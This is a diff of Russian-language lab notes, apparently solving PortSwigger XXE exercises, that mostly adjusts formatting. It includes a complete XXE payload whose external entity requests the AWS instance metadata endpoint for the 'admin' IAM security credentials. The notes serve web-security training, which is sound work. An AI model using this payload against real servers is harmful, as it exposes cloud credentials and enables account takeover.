@@ -1,4 +1,5 @@
 1. https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
+
 1)зайти на сайт, 
 
 2)выбрать продукт, 
@@ -39,9 +40,11 @@ ____
 и так далее, 
 
 n+1)в итоге получаем 
+
 ```xml
 <!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
-```, что и приведёт нас к ответу.
+```
+что и приведёт нас к ответу.
 
 3. https://portswigger.net/web-security/xxe/lab-xinclude-attack
 
